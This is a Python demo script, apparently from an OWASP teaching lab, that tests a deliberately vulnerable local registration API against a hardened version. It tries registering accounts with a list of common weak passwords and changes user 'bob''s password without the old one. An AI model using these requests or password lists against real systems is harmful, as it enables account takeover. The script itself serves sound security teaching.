#!/usr/bin/env python3
"""
弱密碼攻擊腳本
==============
此腳本展示如何利用缺乏密碼強度驗證的註冊 API。

攻擊原理：
---------
漏洞版本允許使用任何密碼註冊，包括常見弱密碼。
攻擊者可以：
1. 使用弱密碼註冊帳號
2. 修改密碼為弱密碼
3. 暴力破解使用弱密碼的帳號

CWE-521: Weak Password Requirements

作者：OWASP Demo
"""

import requests
import argparse
import random
import string

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# 各種弱密碼類型
WEAK_PASSWORDS = {
    "常見密碼": [
        "123456", "password", "qwerty", "letmein", "admin",
        "welcome", "monkey", "dragon", "master", "1234567890"
    ],
    "鍵盤圖案": [
        "qwerty", "qwertyuiop", "asdfgh", "zxcvbn", "1qaz2wsx",
        "qazwsx", "1q2w3e4r", "1234qwer"
    ],
    "純數字": [
        "123456", "111111", "123123", "654321", "000000",
        "12345678", "123456789", "987654321"
    ],
    "常見名稱": [
        "password", "passw0rd", "password1", "Password1",
        "admin123", "root123", "test123", "user123"
    ],
    "太短": [
        "123", "abc", "pwd", "pass", "admin", "root", "test"
    ],
    "無複雜度": [
        "aaaaaaaa", "11111111", "abcdefgh", "password",
        "qwertyui", "asdfghjk"
    ]
}


def register_user(username: str, password: str, email: str, url: str = VULNERABLE_URL) -> dict:
    """
    註冊使用者
    """
    response = requests.post(
        f"{url}/api/auth/register",
        json={
            "username": username,
            "password": password,
            "email": email,
            "fullName": "Test User"
        }
    )
    return {"status": response.status_code, "data": response.json()}


def change_password(username: str, new_password: str, url: str = VULNERABLE_URL) -> dict:
    """
    修改密碼（漏洞版本不需要舊密碼）
    """
    response = requests.post(
        f"{url}/api/auth/change-password",
        json={
            "username": username,
            "newPassword": new_password
        }
    )
    return {"status": response.status_code, "data": response.json()}


def test_weak_password_registration():
    """
    🔴 測試弱密碼註冊
    """
    print("\n" + "=" * 60)
    print("🔴 弱密碼註冊測試")
    print("=" * 60)
    
    # 生成唯一的使用者名稱
    suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
    
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    
    for category, passwords in WEAK_PASSWORDS.items():
        print(f"\n📋 測試類別：{category}")
        
        for pwd in passwords[:3]:  # 每類別測試 3 個
            username = f"test_{suffix}_{len(pwd)}"
            email = f"{username}@test.com"
            suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
            
            result = register_user(username, pwd, email, VULNERABLE_URL)
            
            if result["status"] == 200:
                print(f"   ❌ {pwd:20s} → 接受（弱密碼漏洞！）")
            else:
                error = result["data"].get("error", "未知錯誤")
                print(f"   ✅ {pwd:20s} → 拒絕：{error}")
    
    print("\n🔒 安全版本（http://localhost:8082）：")
    
    for category, passwords in WEAK_PASSWORDS.items():
        print(f"\n📋 測試類別：{category}")
        
        for pwd in passwords[:2]:  # 每類別測試 2 個
            username = f"test_{suffix}"
            email = f"{username}@test.com"
            suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
            
            result = register_user(username, pwd, email, SECURE_URL)
            
            if result["status"] == 200:
                print(f"   ⚠️ {pwd:20s} → 意外接受")
            else:
                error = result["data"].get("error", "")
                if "太常見" in error or "強度不足" in error:
                    print(f"   ✅ {pwd:20s} → 正確拒絕")
                else:
                    print(f"   ? {pwd:20s} → {error}")


def test_password_change_without_old():
    """
    🔴 測試不需舊密碼即可修改
    """
    print("\n" + "=" * 60)
    print("🔴 無舊密碼驗證的密碼修改")
    print("=" * 60)
    
    target = "bob"  # 假設存在的帳號
    new_password = "hacked123"
    
    print(f"\n📋 嘗試修改 '{target}' 的密碼（不提供舊密碼）...")
    
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    result = change_password(target, new_password, VULNERABLE_URL)
    
    if result["status"] == 200:
        print(f"   ❌ 密碼修改成功！（嚴重漏洞）")
        print(f"   攻擊者可以修改任何人的密碼！")
    else:
        print(f"   結果：{result['data']}")
    
    print("\n🔒 安全版本（http://localhost:8082）：")
    print(f"   ✅ 需要提供舊密碼才能修改")
    print(f"   ✅ 需要有效的 JWT Token")


def test_password_complexity():
    """
    🔴 測試密碼複雜度要求
    """
    print("\n" + "=" * 60)
    print("🔴 密碼複雜度要求測試")
    print("=" * 60)
    
    test_cases = [
        ("aaaaaaaa", "純小寫"),
        ("AAAAAAAA", "純大寫"),
        ("12345678", "純數字"),
        ("Abcd1234", "大小寫+數字（應該通過）"),
        ("Ab1!", "太短"),
        ("Abcdefghij", "無數字"),
        ("ABCDEFG123", "無小寫"),
        ("abcdefg123", "無大寫"),
    ]
    
    suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
    
    print("\n🔓 漏洞版本 vs 🔒 安全版本：")
    print("-" * 60)
    
    for pwd, description in test_cases:
        # 漏洞版本
        username_v = f"v_{suffix}"
        email_v = f"{username_v}@test.com"
        suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
        
        result_v = register_user(username_v, pwd, email_v, VULNERABLE_URL)
        vuln_ok = result_v["status"] == 200
        
        # 安全版本
        username_s = f"s_{suffix}"
        email_s = f"{username_s}@test.com"
        suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
        
        result_s = register_user(username_s, pwd, email_s, SECURE_URL)
        secure_ok = result_s["status"] == 200
        
        v_status = "✅" if vuln_ok else "❌"
        s_status = "✅" if secure_ok else "❌"
        
        print(f"   {pwd:20s} ({description:15s})")
        print(f"      漏洞版本: {v_status}  安全版本: {s_status}")


def compare_vulnerability():
    """
    比較漏洞版本與安全版本
    """
    print("\n" + "=" * 60)
    print("📊 弱密碼：漏洞版本 vs 安全版本")
    print("=" * 60)
    
    print("\n🔓 漏洞版本問題：")
    print("   1. ❌ 接受任何密碼（包括 123456）")
    print("   2. ❌ 無長度要求")
    print("   3. ❌ 無複雜度要求")
    print("   4. ❌ 不檢查常見弱密碼")
    print("   5. ❌ 修改密碼不需舊密碼")
    
    print("\n🔒 安全版本防護：")
    print("   1. ✅ 最少 8 個字元")
    print("   2. ✅ 需要大寫字母")
    print("   3. ✅ 需要小寫字母")
    print("   4. ✅ 需要數字")
    print("   5. ✅ 阻擋 Top 10000 常見弱密碼")
    print("   6. ✅ 修改密碼需要驗證舊密碼")
    print("   7. ✅ 新密碼不能與舊密碼相同")


def main():
    parser = argparse.ArgumentParser(
        description="弱密碼攻擊工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python weak_password.py --register      # 測試弱密碼註冊
  python weak_password.py --change        # 測試無舊密碼修改
  python weak_password.py --complexity    # 測試複雜度要求
  python weak_password.py --compare       # 比較漏洞/安全版本
  python weak_password.py --all           # 執行完整演示
        """
    )
    
    parser.add_argument("--register", action="store_true", help="測試弱密碼註冊")
    parser.add_argument("--change", action="store_true", help="測試無舊密碼修改")
    parser.add_argument("--complexity", action="store_true", help="測試複雜度要求")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--all", action="store_true", help="執行完整演示")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🔑 弱密碼攻擊工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    print(f"📍 目標：{VULNERABLE_URL}")
    
    if args.all:
        test_weak_password_registration()
        test_password_change_without_old()
        test_password_complexity()
        compare_vulnerability()
    elif args.register:
        test_weak_password_registration()
    elif args.change:
        test_password_change_without_old()
    elif args.complexity:
        test_password_complexity()
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\n💡 快速開始：python weak_password.py --all")


if __name__ == "__main__":
    main()
